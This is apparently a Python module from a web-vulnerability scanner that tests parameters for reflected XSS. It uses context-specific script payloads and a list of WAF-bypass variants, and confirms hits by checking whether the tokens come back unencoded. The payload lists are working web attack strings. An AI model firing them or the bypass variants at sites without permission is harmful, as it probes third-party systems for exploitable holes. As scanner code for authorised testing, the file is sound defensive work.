"""
XSS Scanner — Reflected, DOM, stored detection

FALSE-POSITIVE ELIMINATION STRATEGY
====================================
PROBLEM: "Payload reflected in response" does NOT mean XSS.
  Modern frameworks encode < > " ' & — the payload may appear in the HTML
  source but be harmless because it's HTML-entity encoded.

CORRECT APPROACH:
  1. Use a unique canary marker embedded in a <script> payload.
  2. Check that the specific JavaScript-executable tokens appear UNENCODED:
     - `<script>` must appear as `<script>` not `&lt;script&gt;`
     - `onerror=` must appear as `onerror=` not `onerror&#61;`
  3. Detect the injection context (html/attribute/script/comment) to:
     a) Choose payloads that work IN that context.
     b) Only report if the context-appropriate indicators appear unencoded.
  4. URL-encoded payload (%3C) is NOT a confirmed XSS — skip those.
  5. Use a unique random string in every payload to prevent false correlation.
"""
from __future__ import annotations
import asyncio
import random
import re
import string
import urllib.parse
from typing import Any

from bs4 import BeautifulSoup
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

# How many chars of unique marker to embed in payloads
MARKER_LEN = 8


def _make_marker() -> str:
    return "TLSM" + "".join(random.choices(string.ascii_uppercase + string.digits, k=MARKER_LEN))


# ---------------------------------------------------------------------------
# Payloads grouped by injection context
# Each payload embeds {MARKER} which will be replaced with a unique string.
# ---------------------------------------------------------------------------
CONTEXT_PAYLOADS: dict[str, list[tuple[str, list[str]]]] = {
    # payload_template, [unencoded_tokens_that_must_appear_in_response]
    "html": [
        ('<script>/*{MARKER}*/alert(1)</script>', ["<script>", "{MARKER}", "alert"]),
        ('<img src=x id={MARKER} onerror=alert(1)>', ["onerror=", "{MARKER}"]),
        ('<svg id={MARKER} onload=alert(1)>', ["onload=", "{MARKER}"]),
        ('<details id={MARKER} open ontoggle=alert(1)>', ["ontoggle=", "{MARKER}"]),
        ('<body id={MARKER} onload=alert(1)>', ["onload=", "{MARKER}"]),
        ('<input id={MARKER} autofocus onfocus=alert(1)>', ["onfocus=", "{MARKER}"]),
        ('<img id={MARKER} src onerror=alert(1)>', ["onerror=", "{MARKER}"]),
        ('<svg><animatetransform id={MARKER} onbegin=alert(1)>', ["onbegin=", "{MARKER}"]),
    ],
    "attribute": [
        ('" id={MARKER} onmouseover="alert(1)"', ['onmouseover="alert', "{MARKER}"]),
        ("' id={MARKER} onmouseover='alert(1)'", ["onmouseover='alert", "{MARKER}"]),
        ('" id={MARKER} autofocus onfocus="alert(1)"', ['onfocus="alert', "{MARKER}"]),
        ('" id={MARKER} onclick="alert(1)"', ['onclick="alert', "{MARKER}"]),
    ],
    "script": [
        (";/*{MARKER}*/alert(1)//", ["/*{MARKER}*/", "alert(1)"]),
        ("';/*{MARKER}*/alert(1)//", ["/*{MARKER}*/", "alert(1)"]),
        ('";/*{MARKER}*/alert(1)//', ["/*{MARKER}*/", "alert(1)"]),
        ("`/*{MARKER}*/`-alert(1)-`", ["/*{MARKER}*/", "alert(1)"]),
    ],
    "comment": [
        ("--><script>/*{MARKER}*/alert(1)</script>", ["<script>", "{MARKER}"]),
        ("--><img id={MARKER} src=x onerror=alert(1)>", ["onerror=", "{MARKER}"]),
    ],
}

# WAF-bypass variants for html context
WAF_BYPASS_PAYLOADS: list[tuple[str, list[str]]] = [
    ('<img\rid={MARKER}\ronerror=alert(1)>', ["onerror=", "{MARKER}"]),
    ('<img\tid={MARKER}\tonerror=alert(1)>', ["onerror=", "{MARKER}"]),
    ('<img\nid={MARKER}\nonerror=alert(1)>', ["onerror=", "{MARKER}"]),
    ('<script>/*{MARKER}*/onerror=alert;throw 1</script>', ["onerror=alert", "{MARKER}"]),
    ('<!--<img src=--><img id={MARKER} src=x onerror=alert(1)//>', ["onerror=", "{MARKER}"]),
    ('<math><mtext><table><mglyph id={MARKER}><style><img src=x onerror=alert(1)>', ["onerror=", "{MARKER}"]),
    ('<noscript><p title="</noscript><img id={MARKER} src=x onerror=alert(1)">', ["onerror=", "{MARKER}"]),
]

# Default params to test when no query params found
DEFAULT_PARAMS = ["q", "search", "s", "query", "id", "name", "input", "data",
                  "value", "text", "msg", "message", "content", "keyword"]


def _detect_context(html: str, marker: str) -> str:
    """
    Detect where the marker appears in the HTML document structure.
    Returns: 'script', 'attribute', 'comment', 'html', or 'unknown'
    """
    idx = html.find(marker)
    if idx == -1:
        return "unknown"

    snippet = html[max(0, idx - 300): idx + 50]

    # Inside a <script> block?
    script_opens = len(re.findall(r'<script[^>]*>', snippet, re.IGNORECASE))
    script_closes = len(re.findall(r'</script>', snippet, re.IGNORECASE))
    if script_opens > script_closes:
        return "script"

    # Inside an HTML comment?
    comment_opens = snippet.count("<!--")
    comment_closes = snippet.count("-->")
    if comment_opens > comment_closes:
        return "comment"

    # Inside an HTML attribute value?
    # Look for preceding open tag with attribute assignment
    attr_pattern = re.search(
        r'<\w+[^>]*\s+\w+=(["\'])[^"\']*$', snippet, re.IGNORECASE
    )
    if attr_pattern:
        return "attribute"

    return "html"


def _is_token_unencoded(response_text: str, token: str) -> bool:
    """
    Return True if *token* appears in response_text WITHOUT HTML encoding.
    Checks for common encoding patterns.
    """
    if token not in response_text:
        return False

    # These would indicate the token is present but encoded
    encoded_variants = [
        token.replace("<", "&lt;").replace(">", "&gt;"),
        token.replace("<", "&#60;").replace(">", "&#62;"),
        token.replace("<", "&#x3C;").replace(">", "&#x3E;"),
        urllib.parse.quote(token),
    ]

    # If ALL occurrences are encoded versions, it's not XSS
    idx = 0
    while True:
        pos = response_text.find(token, idx)
        if pos == -1:
            break
        # Found a raw occurrence — check it's not inside an encoded context
        context = response_text[max(0, pos - 5): pos + len(token) + 5]
        if "&lt;" not in context and "&#" not in context:
            return True
        idx = pos + 1

    return False


def _verify_xss_in_response(
    response_text: str,
    payload: str,
    required_tokens: list[str],
    marker: str,
) -> bool:
    """
    Return True ONLY if ALL required tokens appear UNENCODED in the response.
    """
    for token_template in required_tokens:
        token = token_template.replace("{MARKER}", marker)
        if not _is_token_unencoded(response_text, token):
            return False
    return True


async def _test_param(
    url: str,
    param: str,
    method: str,
    client: TalismanHTTPClient,
    waf_bypass: bool,
) -> dict[str, Any] | None:
    parsed = urllib.parse.urlparse(url)
    base_params = dict(urllib.parse.parse_qsl(parsed.query))

    # --- Step 1: Detect reflection context using a safe marker probe ---
    probe_marker = _make_marker()
    try:
        probe_params = {**base_params, param: probe_marker}
        if method == "GET":
            probe_url = parsed._replace(
                query=urllib.parse.urlencode(probe_params)
            ).geturl()
            probe_r = await client.get(probe_url, timeout=10)
        else:
            probe_r = await client.post(url, data={param: probe_marker}, timeout=10)

        if probe_r.status_code not in (200, 201):
            return None

        # Is the marker reflected at all?
        if probe_marker not in probe_r.text:
            return None

        context = _detect_context(probe_r.text, probe_marker)

    except Exception as e:
        log.debug("xss_probe", param=param, error=str(e)[:60])
        return None

    # --- Step 2: Select and test context-appropriate payloads ---
    payloads_to_test = list(CONTEXT_PAYLOADS.get(context, CONTEXT_PAYLOADS["html"]))
    if waf_bypass:
        payloads_to_test.extend(WAF_BYPASS_PAYLOADS)

    for payload_template, required_tokens in payloads_to_test:
        marker = _make_marker()  # fresh marker per payload
        payload = payload_template.replace("{MARKER}", marker)

        test_params = {**base_params, param: payload}
        try:
            if method == "GET":
                test_url = parsed._replace(
                    query=urllib.parse.urlencode(test_params)
                ).geturl()
                r = await client.get(test_url, timeout=10)
            else:
                r = await client.post(url, data={param: payload}, timeout=10)

            if r.status_code not in (200, 201):
                continue

            # Core verification: are the required tokens UNENCODED in the response?
            if _verify_xss_in_response(r.text, payload, required_tokens, marker):
                # Extract evidence snippet
                idx = r.text.find(marker)
                snippet = r.text[max(0, idx - 50): idx + len(marker) + 100].strip()

                return {
                    "param": param,
                    "payload": payload,
                    "context": context,
                    "method": method,
                    "marker": marker,
                    "status": r.status_code,
                    "evidence": (
                        f"Payload reflected unencoded in {context} context: "
                        f"...{snippet}..."
                    ),
                    "request": (
                        f"{method} {url}?"
                        f"{param}={urllib.parse.quote(payload)} HTTP/1.1"
                    ),
                }

        except Exception as e:
            log.debug("xss_test", param=param, error=str(e)[:60])

    return None


async def run(
    target: str,
    session: Any = None,
    scope: Any = None,
    rate_limiter: Any = None,
    proxy: str | None = None,
    waf_bypass: bool = False,
    oast_domain: str | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    url = target if "://" in target else f"https://{target}"
    console.print(
        f"\n[module] XSS Scanner[/module] → [target]{url}[/target]"
    )
    all_findings: list[dict[str, Any]] = []

    parsed = urllib.parse.urlparse(url)
    params = list(dict(urllib.parse.parse_qsl(parsed.query)).keys())
    if not params:
        params = DEFAULT_PARAMS

    async with TalismanHTTPClient(proxy=proxy, timeout=20) as client:
        tasks = [
            _test_param(url, param, method, client, waf_bypass)
            for param in params
            for method in ["GET", "POST"]
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        seen_params: set[str] = set()
        for result in results:
            if not isinstance(result, dict):
                continue
            key = result["param"]
            if key in seen_params:
                continue
            seen_params.add(key)

            severity = "high"
            print_finding(
                f"Reflected XSS in param '{result['param']}' "
                f"({result['context']} context)",
                severity,
                url,
            )
            all_findings.append(result)

            if session:
                await session.add_finding(
                    target=url,
                    module="xss",
                    vuln_type="reflected_xss",
                    severity=severity,
                    confidence="confirmed",
                    title=(
                        f"Reflected XSS — parameter '{result['param']}' "
                        f"({result['context']} context)"
                    ),
                    description=(
                        f"Reflected XSS confirmed in {result['method']} parameter "
                        f"'{result['param']}'. Payload rendered unencoded in "
                        f"{result['context']} context. Unique marker "
                        f"'{result['marker']}' verified unencoded in DOM."
                    ),
                    request=result["request"],
                    evidence=result["evidence"],
                    reproduction=(
                        f"Navigate to: {url}?"
                        f"{result['param']}={urllib.parse.quote(result['payload'])}"
                    ),
                    remediation=(
                        "Encode all user-supplied data in the appropriate context. "
                        "Implement a strict Content-Security-Policy."
                    ),
                    cvss_score=6.1,
                    cwe="CWE-79",
                    references=["https://owasp.org/www-community/attacks/xss/"],
                )

    console.print(
        f"  Found {len(all_findings)} confirmed XSS vulnerabilities"
    )
    return {"target": url, "findings": all_findings, "count": len(all_findings)}
